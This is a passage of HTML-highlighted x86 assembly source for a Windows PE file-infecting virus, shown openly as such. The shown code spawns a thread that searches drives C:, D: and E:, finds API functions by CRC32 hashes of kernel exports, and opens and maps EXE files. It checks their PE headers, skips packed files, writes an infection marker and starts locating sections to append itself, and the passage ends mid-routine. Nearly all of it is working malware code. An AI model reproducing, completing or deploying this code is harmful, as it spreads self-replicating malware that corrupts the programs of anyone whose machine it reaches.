                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__seed</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; for virii</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">runSeed</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; and for NPE</span><span class="sc0">


                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;files infected=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileNum</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">our_ebp</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">               </span><span class="sc1">;save current delta</span><span class="sc0">
                                                        </span><span class="sc1">;for creating thread</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;ebx=0</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thr_indefirer</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;push 0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;push 0</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Thread_proc</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;offset to thread proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;push 0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;push 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateThread</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Create thread</span><span class="sc0">

</span><span class="sc5">no_yet</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp_tmp_table</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get jmp_table pointer</span><span class="sc0">
                                                        </span><span class="sc1">;to calls_manager</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                                    </span><span class="sc1">;exit to parent code</span><span class="sc0">

</span><span class="sc5">Thread_proc</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0b8h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">__ebp</span><span class="sc4">)</span><span class="sc0">                      </span><span class="sc1">;mov ebp,xxxxxxxx</span><span class="sc0">
                </span><span class="sc5">our_ebp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchRec</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dirname</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'\:C'</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">filefind</span><span class="sc0">                           </span><span class="sc1">;infect drives</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'\:D'</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">filefind</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'\:E'</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">filefind</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                                 </span><span class="sc1">;mov eax,xxxxxxxx</span><span class="sc0">
</span><span class="sc5">Thr_indefirer</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitThread</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;good bye!</span><span class="sc0">

</span><span class="sc1">;=========================================================================================</span><span class="sc0">
</span><span class="sc1">;Input: esi=offset of string</span><span class="sc0">
</span><span class="sc1">;       ebx=kernel adr</span><span class="sc0">
</span><span class="sc1">;Out  : eax=adr(if has finded;))</span><span class="sc0">

</span><span class="sc5">get_proc_adr</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;save getted crc</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;PE-header offset</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;Export table offset</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">return_0</span><span class="sc0">                          </span><span class="sc1">;if (et=null) then err</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;ecx-offset of export</span><span class="sc0">
                                                        </span><span class="sc1">;table</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">_search</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;offsets on FuncNames</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;correct on base</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;crc table</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;base</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">find_zero</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">find_zero</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0b8h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">__edx</span><span class="sc4">)</span><span class="sc0">                      </span><span class="sc1">;mov edx,crc</span><span class="sc0">
                </span><span class="sc5">crc32</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;base</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;table</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_name_found</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">_search</span><span class="sc0">

</span><span class="sc5">return_0</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;error ocures</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_return</span><span class="sc0">

</span><span class="sc5">_name_found</span><span class="sc4">:</span><span class="sc0">
                                                        </span><span class="sc1">;esi=index on string table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;AdrTable</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;correct on base</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;get adress of nedded function</span><span class="sc0">

</span><span class="sc5">_return</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;in output eax</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">get_proc_adr</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;=============================================================================</span><span class="sc0">
</span><span class="sc1">;                               INFECT</span><span class="sc0">
</span><span class="sc1">;=============================================================================</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;esi=edx=full name</span><span class="sc0">

</span><span class="sc5">_findzero</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_findzero</span><span class="sc0">
                                                        </span><span class="sc1">;esi=offset of null byte+1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00455845h</span><span class="sc0">                       </span><span class="sc1">;EXE?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exe_infect</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00657865h</span><span class="sc0">                       </span><span class="sc1">;exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_EXE</span><span class="sc0">

</span><span class="sc5">exe_infect</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileNum</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc2">15</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">no_EXE</span><span class="sc0">                               </span><span class="sc1">;More than 15 files?</span><span class="sc0">

</span><span class="sc5">_gogo</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fopen</span><span class="sc0">                              </span><span class="sc1">;edx=FileName</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;error ocures?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_close_exit</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;ebx=handle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">f_createmap</span><span class="sc0">                        </span><span class="sc1">;createfilemapping</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MZbase</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;edx=mem_adr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_close_exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;EDX=offset of PE header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">                             </span><span class="sc1">;really PE ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_close_exit</span><span class="sc0">


</span><span class="sc1">;get last section</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;NT header size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                             </span><span class="sc1">;Size of PE-header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;Eax=offset of Object table</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;Number of objects</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc5">smov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                             </span><span class="sc1">;size of table</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;result in EDX:EAX</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;ESI=offset of last object</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;edi=Object-table</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;correct(esi=last object)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;=============================================================================</span><span class="sc0">

</span><span class="sc1">;find  winzip or UPX0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;Number of objects</span><span class="sc0">
</span><span class="sc5">find_upx</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'niw_'</span><span class="sc0">                   </span><span class="sc1">;_winzip_</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">zip_upx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'0XPU'</span><span class="sc0">                   </span><span class="sc1">;UPX0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">zip_upx</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">find_upx</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">zip_upx</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;=============================================================================</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">i_close_exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;get &amp; save imagebase</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;get Fsize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Fsize</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;get Vsize</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;Vsize=0?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">i_close_exit</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                              </span><span class="sc1">;Fsize=0?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">i_close_exit</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;Vsize&lt;Fsize</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">i_close_exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;get Foffset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Foff</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;get Voffset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Voff</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'emit'</span><span class="sc0">                          </span><span class="sc1">;check &amp; write sign</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_close_exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;esi=last (copy)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;SAve VO of virii</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;obj-table offst</span><span class="sc0">



</span><span class="sc1">;find .reloc section</span><span class="sc0">
